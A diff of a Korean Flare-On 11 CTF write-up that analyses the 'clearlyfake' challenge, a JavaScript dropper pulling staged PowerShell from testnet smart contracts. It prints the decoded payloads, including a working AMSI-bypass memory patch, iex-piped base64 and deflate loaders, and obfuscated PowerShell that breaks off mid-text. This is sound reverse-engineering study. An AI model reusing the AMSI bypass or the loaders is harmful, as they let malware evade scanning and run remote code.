@@ -1,7 +1,7 @@
 ---
 layout: post
-title: Flare-On 11 Writeup (6-10)
-subtitle: bloke2
+title: Flare-On 11 Writeup (6-8)
+subtitle: fullspeed, bloke2
 thumbnail-img: /assets/img/writeups/202412/6_1.png
 tags: [Writeup, Reversing]
 comments: true
@@ -10,7 +10,7 @@ color: FFB6B6
 ctf_date: 2024-10-27
 probs:
   - [bloke2, 6, Reversing, Verilog]
-  - [fullspeed, 7, Reversing, AOT.NET / ECDH]
+  - [fullspeed, 7, Reversing, AOT Compiled .NET / Elliptic-curve Diffie–Hellman]
 ---
 
 [Flare-On 11 Writeup (1-5)](https://blog.jeongramon.dev/2024-12-02-FlareOn_11_Writeup/)에서 이어지는 글이다. 
@@ -888,3 +888,473 @@ def get_kG():
 
 kG = get_kG()
 ```
+
+<br />
+
+# clearlyfake
+
+난독화된 `js`가 주어진다. 난독화를 해제하면 `Binance Smart Chain` 테스트넷에서 특정 스마트 컨트랙트를 호출한다. 스마트 컨트랙트 관련 기초적인 이해만 있으면 문제를 풀 수 있다.
+
+<br />
+
+## 초기 접근
+
+### 난독화 해제
+[Deobfuscator](https://deobfuscate.relative.im/)를 활용하여 난독화 해제 한다.
+
+```js
+eval(
+  (function (_0x263ea1, _0x2e472c, _0x557543, _0x36d382, _0x28c14a, _0x39d737) {
+    _0x28c14a = function (_0x3fad89) {
+      return (
+        (_0x3fad89 < _0x2e472c
+          ? ''
+          : _0x28c14a(parseInt(_0x3fad89 / _0x2e472c))) +
+        ((_0x3fad89 = _0x3fad89 % _0x2e472c) > 35
+          ? String.fromCharCode(_0x3fad89 + 29)
+          : _0x3fad89.toString(36))
+      )
+    ...
+```
+<br />
+
+추가적으로 [de4js](https://lelinhtinh.github.io/de4js/)를 활용하면 `eval`도 깔끔하게 난독화 해제할 수 있다.
+
+```js
+const Web3 = require("web3");
+const fs = require("fs");
+const web3 = new Web3("BINANCE_TESTNET_RPC_URL");
+const contractAddress = "0x9223f0630c598a200f99c5d4746531d10319a569";
+async function callContractFunction(inputString) {
+    try {
+        const methodId = "0x5684cff5";
+        const encodedData = methodId + web3.eth.abi.encodeParameters(["string"], [inputString]).slice(2);
+        const result = await web3.eth.call({
+            to: contractAddress,
+            data: encodedData
+        });
+        const largeString = web3.eth.abi.decodeParameter("string", result);
+        const targetAddress = Buffer.from(largeString, "base64").toString("utf-8");
+        const filePath = "decoded_output.txt";
+        fs.writeFileSync(filePath, "$address = " + targetAddress + "\n");
+        const new_methodId = "0x5c880fcb";
+        const blockNumber = 43152014;
+        const newEncodedData = new_methodId + web3.eth.abi.encodeParameters(["address"], [targetAddress]).slice(2);
+        const newData = await web3.eth.call({
+            to: contractAddress,
+            data: newEncodedData
+        }, blockNumber);
+        const decodedData = web3.eth.abi.decodeParameter("string", newData);
+        const base64DecodedData = Buffer.from(decodedData, "base64").toString("utf-8");
+        fs.writeFileSync(filePath, decodedData);
+        console.log(`Saved decoded data to:${filePath}`)
+    } catch (error) {
+        console.error("Error calling contract function:", error)
+    }
+}
+const inputString = "KEY_CHECK_VALUE";
+callContractFunction(inputString);
+```
+
+<br />
+
+### Smart Contract Decompile
+
+Contract Adress가 주어졌으므로 [BSCscan](testnet.bscscan.com)을 이용해 검색한다. 코드에 쓰여있듯 `TESTNET`에 검색해야 한다.
+
+![image](/assets/img/writeups/202412/8_0.jpg)
+
+<br />
+
+Contract 탭에서 스마트 컨트랙트를 확인하려 했는데 디컴파일이 오류가 났다. OpCode 탭을 보니까 `invalid opcode`가 포함된 것으로 표기된다. 이미 잘 돌아간 스마트 컨트랙트가 컴파일 오류가 났을리 없으므로, `BSCscan` 자체 디컴파일러가 문제가 있는 것으로 결론 내렸다. 그래서 다른른 디컴파일러 [dedaub](https://app.dedaub.com/)를 활용하였더니 디컴파일이 잘 됐다. 
+
+![image](/assets/img/writeups/202412/8_1.jpg)
+
+<br />
+
+## Smart Contract
+
+### Contract 0x9223f0...
+주어진 문자열의 첫 자가 0x67, 둘째 자가 0x69 등의 조건을 만족하면 `0x5324eab94b236d4d1456edc574363b113cebf09`를 `return`한다. 
+
+```js
+function fallback() public payable { 
+    revert();
+}
+
+function testStr(string str) public payable { 
+    require(4 + (msg.data.length - 4) - 4 >= 32);
+    require(str <= uint64.max);
+    require(4 + str + 31 < 4 + (msg.data.length - 4));
+    require(str.length <= uint64.max, Panic(65)); // failed memory allocation (too much memory)
+    v0 = new bytes[](str.length);
+    require(!((v0 + ((str.length + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) + 32 + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) > uint64.max) | (v0 + ((str.length + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) + 32 + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) < v0)), Panic(65)); // failed memory allocation (too much memory)
+    require(str.data + str.length <= 4 + (msg.data.length - 4));
+    CALLDATACOPY(v0.data, str.data, str.length);
+    v0[str.length] = 0;
+    if (v0.length == 17) {
+        require(0 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+        v1 = v0.data;
+        if (bytes1(v0[0] >> 248 << 248) == 0x6700000000000000000000000000000000000000000000000000000000000000) {
+            require(1 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+            if (bytes1(v0[1] >> 248 << 248) == 0x6900000000000000000000000000000000000000000000000000000000000000) {
+                require(2 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                if (bytes1(v0[2] >> 248 << 248) == 0x5600000000000000000000000000000000000000000000000000000000000000) {
+                    require(3 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                    if (bytes1(v0[3] >> 248 << 248) == 0x3300000000000000000000000000000000000000000000000000000000000000) {
+                        require(4 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                        if (bytes1(v0[4] >> 248 << 248) == 0x5f00000000000000000000000000000000000000000000000000000000000000) {
+                            require(5 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                            if (bytes1(v0[5] >> 248 << 248) == 0x4d00000000000000000000000000000000000000000000000000000000000000) {
+                                require(6 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                if (bytes1(v0[6] >> 248 << 248) == 0x3300000000000000000000000000000000000000000000000000000000000000) {
+                                    require(7 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                    if (bytes1(v0[7] >> 248 << 248) == 0x5f00000000000000000000000000000000000000000000000000000000000000) {
+                                        require(8 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                        if (bytes1(v0[8] >> 248 << 248) == 0x7000000000000000000000000000000000000000000000000000000000000000) {
+                                            require(9 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                            if (bytes1(v0[9] >> 248 << 248) == 0x3400000000000000000000000000000000000000000000000000000000000000) {
+                                                require(10 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                                if (bytes1(v0[10] >> 248 << 248) == 0x7900000000000000000000000000000000000000000000000000000000000000) {
+                                                    require(11 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                                    if (bytes1(v0[11] >> 248 << 248) == 0x4c00000000000000000000000000000000000000000000000000000000000000) {
+                                                        require(12 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                                        if (bytes1(v0[12] >> 248 << 248) == 0x3000000000000000000000000000000000000000000000000000000000000000) {
+                                                            require(13 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                                            if (bytes1(v0[13] >> 248 << 248) == 0x3400000000000000000000000000000000000000000000000000000000000000) {
+                                                                require(14 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                                                if (bytes1(v0[14] >> 248 << 248) == 0x6400000000000000000000000000000000000000000000000000000000000000) {
+                                                                    require(15 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
+                                                                    if (bytes1(v0[15] >> 248 << 248) == 0x2100000000000000000000000000000000000000000000000000000000000000) {
+                                                                        v2 = v3.data;
+                                                                        v4 = bytes20(0x5324eab94b236d4d1456edc574363b113cebf09d000000000000000000000000);
+                                                                        if (v3.length < 20) {
+                                                                            v4 = v5 = bytes20(v4);
+                                                                        }
+                                                                        v6 = v7 = v4 >> 96;
+                                                                    } else {
+                                                                        v6 = v8 = 0;
+                                                                    }
+                                                                } else {
+                                                                    v6 = v9 = 0xce89026407fb4736190e26dcfd5aa10f03d90b5c;
+                                                                }
+                                                            } else {
+                                                                v6 = v10 = 0x506dffbcdaf9fe309e2177b21ef999ef3b59ec5e;
+                                                            }
+                                                        } else {
+                                                            v6 = v11 = 0x26b1822a8f013274213054a428bdbb6eba267eb9;
+                                                        }
+                                                    } else {
+                                                        v6 = v12 = 0xf7fc7a6579afa75832b34abbcf35cb0793fce8cc;
+                                                    }
+                                                } else {
+                                                    v6 = v13 = 0x83c2cbf5454841000f7e43ab07a1b8dc46f1cec3;
+                                                }
+                                            } else {
+                                                v6 = v14 = 0x632fb8ee1953f179f2abd8b54bd31a0060fdca7e;
+                                            }
+                                        } else {
+                                            v6 = v15 = 0x3bd70e10d71c6e882e3c1809d26a310d793646eb;
+                                        }
+                                    } else {
+                                        v6 = v16 = 0xe2e3dd883af48600b875522c859fdd92cd8b4f54;
+                                    }
+                                } else {
+                                    v6 = v17 = 0x4b9e3b307f05fe6f5796919a3ea548e85b96a8fe;
+                                }
+                            } else {
+                                v6 = v18 = 0x6371b88cc8288527bc9dab7ec68671f69f0e0862;
+                            }
+                        } else {
+                            v6 = v19 = 0x53fbb505c39c6d8eeb3db3ac3e73c073cd9876f8;
+                        }
+                    } else {
+                        v6 = v20 = 0x84abec6eb54b659a802effc697cdc07b414acc4a;
+                    }
+                } else {
+                    v6 = v21 = 0x87b6cf4edf2d0e57d6f64d39ca2c07202ab7404c;
+                }
+            } else {
+                v6 = v22 = 0x53387f3321fd69d1e030bb921230dfb188826aff;
+            }
+        } else {
+            v6 = v23 = 0x40d3256eb0babe89f0ea54edaa398513136612f5;
+        }
+    } else {
+        v6 = v24 = 0x76d76ee8823de52a1a431884c2ca930c5e72bff3;
+    }
+    MEM[MEM[64]] = address(v6);
+    return address(v6);
+}
+
+// Note: The function selector is not present in the original solidity code.
+// However, we display it for the sake of completeness.
+
+function __function_selector__( function_selector) public payable { 
+    MEM[64] = 128;
+    require(!msg.value);
+    if (msg.data.length >= 4) {
+        if (0x5684cff5 == function_selector >> 224) {
+            testStr(string);
+        }
+    }
+    fallback();
+}
+```
+
+<br />
+
+참고로 만족시키는 문자열은 해독해보면 아래 사진과 같다. ~~정답과 관련은 없지만 맞는 방향으로 나아가고 있다는 확신을 준다.~~
+
+![image](/assets/img/writeups/202412/8_2.jpg)
+
+<br />
+
+### Contract 0x5324ea...
+
+최초 `js`를 다시 살펴보자. 첫번째 스마트 컨트랙트에서 `return`한 문자열을 인자로 다음 스마트 컨트랙트를 호출한다.
+
+```js
+const largeString = web3.eth.abi.decodeParameter("string", result);
+        const targetAddress = Buffer.from(largeString, "base64").toString("utf-8");
+        const filePath = "decoded_output.txt";
+        fs.writeFileSync(filePath, "$address = " + targetAddress + "\n");
+        const new_methodId = "0x5c880fcb";
+        const blockNumber = 43152014;
+        const newEncodedData = new_methodId + web3.eth.abi.encodeParameters(["address"], [targetAddress]).slice(2);
+        const newData = await web3.eth.call({
+            to: contractAddress,
+            data: newEncodedData
+        }, blockNumber);
+```
+
+<br />
+
+`block number`가 주어졌으므로 해당 블록을 [BSCscan](testnet.bscscan.com)에서 확인한다. input data가 존재하는데, 어딜 봐도 `base64`다. 
+
+![image](/assets/img/writeups/202412/8_3.jpg)
+
+<br />
+
+앞 부분을 조금 지워가며 `base64 decode`를 하면 파워쉘 명령을 얻을 수 있다. `base64` 인코딩된 문자열이 또 보이므로 한번 더 디코딩딩한다.
+
+```js
+ø[sYstEm.Text.eNCODinG]::unicodE.getStrinG([sYstEm.cONvErt]::FroMbaSE64stRInG("IwBSAGEAcwB0AGEALQBtAG8AdQBzAGUAcwAgAEEAbQBzAGkALQBTAGMAYQBuAC0AQgB1AGYAZgBlAHIAIABwAGEAdABjAGgAIABcAG4ADQAKACQAZgBoAGYAeQBjACAAPQAgAEAAIgANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABmAGgAZgB5AGMAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAaQB4AGEAagBtAHoALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAAJABmAGgAZgB5AGMADQAKAA0ACgAkAG4AegB3AHQAZwB2AGQAIAA9ACAAWwBmAGgAZgB5AGMAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgAkACgAKAAnAOMAbQBzAO0ALgAnACsAJwBkAGwAbAAnACkALgBOAE8AcgBtAEEAbABpAHoARQAoAFsAYwBIAGEAUgBdACgANwAwACoAMwAxAC8AMwAxACkAKwBbAGMAaABhAHIAXQAoADEAMQAxACkAKwBbAEMAaABhAHIAXQAoAFsAQgB5AHQAZQBdADAAeAA3ADIAKQArAFsAQwBIAGEAUgBdACgAMQAwADkAKwA2ADAALQA2ADAAKQArAFsAQwBoAGEAUgBdACgANQA0ACsAMQA0ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAYwBoAGEAUgBdACgAWwBiAFkAVABFAF0AMAB4ADUAYwApACsAWwBDAEgAYQByAF0AKABbAGIAWQBUAEUAXQAwAHgANwAwACkAKwBbAEMAaABBAFIAXQAoADEAMgAzACsAMgAtADIAKQArAFsAQwBIAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADQAZAApACsAWwBDAGgAQQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANgBlACkAKwBbAGMAaABhAHIAXQAoAFsAYgB5AFQARQBdADAAeAA3AGQAKQApACIAKQANAAoAJABuAGoAeQB3AGcAbwAgAD0AIABbAGYAaABmAHkAYwBdADoAOgBHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKAAkAG4AegB3AHQAZwB2AGQALAAgACIAJAAoACgAJwDBAG0AcwDsAFMAYwAnACsAJwDkAG4AQgB1AGYAZgAnACsAJwBlAHIAJwApAC4ATgBPAHIAbQBBAEwASQB6AEUAKABbAEMASABhAFIAXQAoAFsAYgBZAFQARQBdADAAeAA0ADYAKQArAFsAQwBoAGEAcgBdACgAWwBiAFkAVABlAF0AMAB4ADYAZgApACsAWwBjAEgAQQByAF0AKABbAGIAWQBUAEUAXQAwAHgANwAyACkAKwBbAEMASABhAHIAXQAoADEAMAA5ACkAKwBbAGMASABhAFIAXQAoAFsAQgB5AFQAZQBdADAAeAA0ADQAKQApACAALQByAGUAcABsAGEAYwBlACAAWwBjAGgAQQBSAF0AKAA5ADIAKQArAFsAQwBoAGEAcgBdACgAWwBiAHkAVABFAF0AMAB4ADcAMAApACsAWwBjAGgAYQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANwBiACkAKwBbAGMAaABhAFIAXQAoAFsAQgBZAHQARQBdADAAeAA0AGQAKQArAFsAYwBoAGEAcgBdACgAMgAxACsAOAA5ACkAKwBbAGMAaABhAFIAXQAoADMAMQArADkANAApACkAIgApAA0ACgAkAHAAIAA9ACAAMAANAAoAWwBmAGgAZgB5AGMAXQA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABuAGoAeQB3AGcAbwAsACAAWwB1AGkAbgB0ADMAMgBdADUALAAgADAAeAA0ADAALAAgAFsAcgBlAGYAXQAkAHAAKQANAAoAJABoAGEAbAB5ACAAPQAgACIAMAB4AEIAOAAiAA0ACgAkAGQAZABuAGcAIAA9ACAAIgAwAHgANQA3ACIADQAKACQAeABkAGUAcQAgAD0AIAAiADAAeAAwADAAIgANAAoAJABtAGIAcgBmACAAPQAgACIAMAB4ADAANwAiAA0ACgAkAGUAdwBhAHEAIAA9ACAAIgAwAHgAOAAwACIADQAKACQAZgBxAHoAdAAgAD0AIAAiADAAeABDADMAIgANAAoAJAB5AGYAbgBqAGIAIAA9ACAAWwBCAHkAdABlAFsAXQBdACAAKAAkAGgAYQBsAHkALAAkAGQAZABuAGcALAAkAHgAZABlAHEALAAkAG0AYgByAGYALAArACQAZQB3AGEAcQAsACsAJABmAHEAegB0ACkADQAKAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAHkAZgBuAGoAYgAsACAAMAAsACAAJABuAGoAeQB3AGcAbwAsACAANgApAA=="))|iex
+```
+
+<br />
+
+뭔가 나오긴 했는데 문제와 별 관련이 없어 보인다. ~~놀랍게도 그것은 사실이다.~~ 출제 오류로 flag 관련 부분이 input에 포함되지 않았다고 한다. 출제진이 문제 오류를 패치하여 `block number 44335452`를 추가하였으므로 해당 블록을 보자.
+
+```js
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$fhfyc = @"
+using System;
+using System.Runtime.InteropServices;
+public class fhfyc {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ixajmz, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $fhfyc
+
+$nzwtgvd = [fhfyc]::LoadLibrary("$(('ãmsí.'+'dll').NOrmAlizE([cHaR](70*31/31)+[char](111)+[Char]([Byte]0x72)+[CHaR](109+60-60)+[ChaR](54+14)) -replace [chaR]([bYTE]0x5c)+[CHar]([bYTE]0x70)+[ChAR](123+2-2)+[CHar]([byte]0x4d)+[ChAR]([bYTE]0x6e)+[char]([byTE]0x7d))")
+$njywgo = [fhfyc]::GetProcAddress($nzwtgvd, "$(('ÁmsìSc'+'änBuff'+'er').NOrmALIzE([CHaR]([bYTE]0x46)+[Char]([bYTe]0x6f)+[cHAr]([bYTE]0x72)+[CHar](109)+[cHaR]([ByTe]0x44)) -replace [chAR](92)+[Char]([byTE]0x70)+[chaR]([bYTE]0x7b)+[chaR]([BYtE]0x4d)+[char](21+89)+[chaR](31+94))")
+$p = 0
+[fhfyc]::VirtualProtect($njywgo, [uint32]5, 0x40, [ref]$p)
+$haly = "0xB8"
+$ddng = "0x57"
+$xdeq = "0x00"
+$mbrf = "0x07"
+$ewaq = "0x80"
+$fqzt = "0xC3"
+$yfnjb = [Byte[]] ($haly,$ddng,$xdeq,$mbrf,+$ewaq,+$fqzt)
+[System.Runtime.InteropServices.Marshal]::Copy($yfnjb, 0, $njywgo, 6)
+```
+<br />
+
+같은 방식으로 base64 디코딩된 input이 존재하며, 해제하면 아래와 같은 파워쉘 코드를 얻을 수 있다. 
+
+```
+øinvOKe-eXpREsSIon (NeW-OBJeCt SystEm.Io.StReaMREAdeR((NeW-OBJeCt Io.COMPRESsIOn.deflATestream( [sYSTeM.Io.memORyStREaM] [cONvErt]::fROmbAsE64StriNg('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' ) , [iO.compRESSION.CompREsSionMode]::dEcoMPrEss ) ) , [SyStEm.TEXt.EnCodINg]::asCII)).ReaDTOEND()
+```
+
+<br />
+
+난독화된 문자열을 `base64 decoding`, `raw inflate`하면 난독화 해제가 가능하며, 다시금 파워쉘 명령을 얻을 수 있다.
+
+
+<br />
+
+## Powershell Deobfuscation
+
+조금 복잡해보이지만, 간추리면 `~~~~~~| &( ([stRing]$VErboSEpRefeReNCe)[1,3]+'X'-joiN'')` 형태이다. `[stRing]$VErboSEpRefeReNCe[1,3] + 'X'`은 `powershell`에 기본적으로 정해져있는 변수로, `"SilentlyContinue" `를 나타낸다. 때문에 결과적으로 `~~~~~|iex`의 형태가 되므로, 앞 `~~~~~`만 powershell로 실행한다.
+
+```js
+(("{39}{64}{57}{45}{70}{59}{9}{66}{0}{31}{21}{50}{6}{56}{5}{22}{69}{71}{43}{60}{8}{35}{68}{44}{1}{19}{41}{30}{67}{38}{18}{7}{33}{54}{63}{34}{61}{24}{48}{4}{47}{3}{40}{51}{26}{42}{15}{37}{12}{10}{11}{52}{14}{23}{29}{53}{25}{16}{49}{55}{62}{36}{27}{28}{13}{17}{46}{20}{2}{65}{58}{32}"-f 'CSAKoY+K','xed','P dKoY+KoYohteM- doKoY+KoYhteMtseR-ekovnI(( eulaV- pser emaN- elbairaV-teS
+)1aP}Iz70.2Iz7:Iz7cprnosjIzKoY+KoY7,1:Iz7diIz7,]KCOLB ,}Iz7bcf088c5x0Iz7:Iz7atadIz7,KoY+KoYIz7sserddaK6fIz7:Iz7otIz7KoY+KoY{[:Iz7smarapIz7,Iz7llac_hteIz7:Iz7d','aBmorFsKoY+KoYetybK6f(gnirtSteKoY+KoYG.8FTU::]gniKoY+KoYdocnE.txeKoY+KoYT.metsyS[( KoY+KoYeulaV- KoY+KoYiicsAtluser emaN-KoY+KoY elbairaV-teS
+))2setybK6f(gniKoY+KoYrtS46esaBmorF::]trevnoC[( eulaV- 46esaBmorFsetyb ema','tamroF #  _K6f f- 1aP}2X:0{1aP    
+{ tcejbO-hcaEroF sOI ii','KoY+KoYab tlKoY+KoYuKoY+KoYser eht trevnoC #
+}
+ ))]htgneL.setyByekK6f % iK6f[setyByekK6f roxb-','teS
+)gnidocne IICSA gnimussa( gnirts','KoY+KoYV-','eT[( eulaV- 5setyb emaN- elbairaV-teS
+)}
+)61 ,)2 ,xednItratsK6f(gnirtsbuS.setyBxehK6f(etyBo','c[((EcALPER.)93]RAHc[]GnIRTS[,)94]RAHc[+79]RAHc[+08]RAHc[((EcALPER.)63]RAHc[]GnIRTS[,)57]RAHc[+45]RAHc[+201]RAHc[((EcALPER.)KoY
+dnammocK6f noisserpxE-ekovnI
+)Iz7galfZjWZjW:C f- 1aPgaKoY+KoYlfZjWZjW:C > gnirtStlKoY+KoYuserK6KoY+KoYf ohce c/ dm','N- ','elbai','yb ema',')tl','.rebmuNxehK6f(etyBoT::]trevnoC[  ','0setybK6f(gni','Y+KoYcejbO-hcaEroFKoY+KoY sOI )1','user.)ydob_K6f ydoB- Iz7nosj/noitacil','usne( setyb ot xeh KoY+KoYmorf trevnoC #
+)Iz7Iz7 ,Iz7 Iz7 ecalper- setyBxehK6f(KoY+KoY eula','nItrats em','noKoY+KoYC- tniopdne_tentsetK6f irU- 1aPtsoP1a','eT.metsyS[( eulaV- gnirtStluser emaN-',' ]iK6f[5setybK6f( + setyBtluserK6f( eulaV- ','KoY+KoY  
+)1 + xednKoY+KoYItratsK6f( eu','eS
+)}
+srettel esacrKoY+KoYeppu htiw xeh tigid-',' KoY+KoYtKo','ulaV','f( eulaV','- rebmuNxeh emaN- elbairaV-teS
+xiferp 1aPx01aP eht evomeR KoY+KoY#
+
